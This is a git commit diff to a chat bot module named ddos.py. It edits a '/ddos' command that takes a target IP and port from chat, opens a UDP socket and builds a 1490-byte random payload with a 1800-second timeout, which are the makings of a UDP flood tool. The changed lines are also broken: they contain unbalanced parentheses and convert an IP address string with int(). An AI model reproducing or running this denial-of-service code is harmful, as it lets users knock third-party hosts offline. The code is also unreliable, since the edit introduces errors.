c19a4d2c321f06b02efe000a63660fbb61339c9f
Ayush Chatterjee <54566209+Ayush1311@users.noreply.github.com>
2020-09-07 15:31:46 +0530

    Update ddos.py

--- alexa/modules/ddos.py
+++ alexa/modules/ddos.py
@@ -7,8 +7,10 @@ from alexa.events import alexabot
 
 @alexabot(pattern="/ddos (.*) (.*)")
 async def ddos(event): 
-  ip = str(event.pattern_match.group(1))
-  port = str(event.pattern_match.group(2))
+  iip = event.pattern_match.group(1))
+  portt = event.pattern_match.group(2))
+  ip = int(iip)
+  port = int(portt)
   timeout = 1800
   sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   bytes = random._urandom(1490)
